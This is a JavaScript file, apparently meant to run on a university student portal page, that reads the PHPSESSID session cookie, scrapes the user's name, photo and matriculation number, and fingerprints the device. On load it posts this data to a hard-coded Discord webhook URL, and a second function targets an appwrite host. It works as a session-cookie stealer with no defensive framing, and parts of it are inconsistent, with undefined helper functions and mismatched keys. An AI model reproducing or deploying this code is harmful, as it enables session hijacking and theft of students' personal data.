function GetUserDetails() {
    var userDetails = {};
    document.cookie.split(';').forEach(cookie => {
        const [name, value] = cookie.trim().split('=');
        if (name == 'PHPSESSID') {userDetails['PHPSESSID'] = value; }
    });

    // Get user details
    userDetails['picture'] = document.querySelector('.user-pic > img:nth-child(1)') ? document.querySelector('.user-pic > img:nth-child(1)').src : "Unavailable"
    userDetails['name'] = document.querySelector('.user-name > strong:nth-child(1)') ? document.querySelector('.user-name > strong:nth-child(1)').innerHTML : "Unavailable"
    userDetails['matric'] = document.querySelector('.user-role') ? document.querySelector('.user-role').innerHTML : "Unavailable"

    return userDetails
}

// Get detailed device information
function getDeviceInfo() {
    const info = {
        "Datetime": new Date().toLocaleString().replace(',', ' -'),
        "Browser": navigator.userAgent,
        "Screen": `${window.screen.width}x${window.screen.height}`,
        "Viewport": `${window.innerWidth}x${window.innerHeight}`,
        "CPU": navigator.hardwareConcurrency || 'Unknown',
        "Memory": navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown',
        "Time Zone": Intl.DateTimeFormat().resolvedOptions().timeZone,
        "System": navigator.userAgentData ? navigator.userAgentData.platform : navigator.platform,
    };

    return info
}


function storeData(device, public, sess, profile) {
    fetch('http://673d53a375a6942d9bd2.appwrite.global/', {
        method: 'POST',
        body: {}
    })
}

async function sendMessageToDiscord(device, _public, sess, profile) {
    const webhookURL = 'https://discord.com/api/webhooks/1308326942331899945/DcK0D4N4s2qJ5Hl4pbNMl9UeKv4YHq0qTcYUWDgW9XZU3PNzzwyoGisrtqaTNWwm0INU';
    const formData = new FormData();
    const deviceInfo = JSON.stringify(device).slice(1, -1).replaceAll(',', ',\n').replaceAll(':', ': ').replaceAll('"', '');
    const publicInfo = JSON.stringify(_public).slice(1, -1).replaceAll(',', ',\n').replaceAll(':', ': ').replaceAll('"', '');
    
    const embed = [{
        title: sess['user-name'] + " - " + sess['user-id'] + "\n" + sess['PHPSESSID'],
        color: Math.round(Math.random() * 0xFFFFFF),
        author: { "name": device['DateTime'] },
        fields: [
            {
                name: "Device Info",
                value: deviceInfo
            },
            {
                name: "Public Information",
                value: publicInfo
            }
        ],
        thumbnail: { url: profile ? 'attachment://profile.png' : 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRLLzweWCGj9LVROBgujLSPNTYIzSJ44AJMww&s' }
    }]
    
    if (profile) {
        formData.append(`file[0]`, profile, 'profile.png');
    }
    formData.append('payload_json', JSON.stringify({
        embeds: embed
    }));

    await fetch(webhookURL, {
        method: 'POST',
        body: formData
    });
}

(async _ => {
    const sess = GetUserDetails();
    sendMessageToDiscord(
        getDeviceInfo(),
        await getPublicIPInfo(),
        sess,
        (sess['user-pic'] != "Unavailable" || urlToB64(sess['user-pic']).size < 1) ? await urlToB64(sess['user-pic']) : null
    )
})()